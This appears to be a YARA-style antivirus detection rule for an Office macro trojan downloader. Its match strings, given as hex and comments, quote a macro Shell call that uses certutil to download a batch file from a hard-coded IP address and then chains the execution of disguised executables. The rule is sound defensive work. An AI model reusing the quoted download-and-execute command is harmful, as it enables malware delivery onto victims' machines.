
rule TrojanDownloader_O97M_EncDoc_PKP_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.PKP!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 35 32 2e 35 39 2e 32 33 34 2e 31 38 30 2f 63 6c 61 73 73 2f 74 65 6e 2f 36 35 30 38 37 37 31 30 30 33 33 2e 62 61 74 } //01 00  = Shell("cmd /c certutil.exe -urlcache -split -f ""http://52.59.234.180/class/ten/65087710033.bat
		$a_01_1 = {2e 65 78 65 2e 65 78 65 20 26 26 20 47 72 66 63 69 61 66 68 6a 71 67 68 71 71 74 79 79 62 2e 65 78 65 2e 65 78 65 } //00 00  .exe.exe && Grfciafhjqghqqtyyb.exe.exe
	condition:
		any of ($a_*)
 
}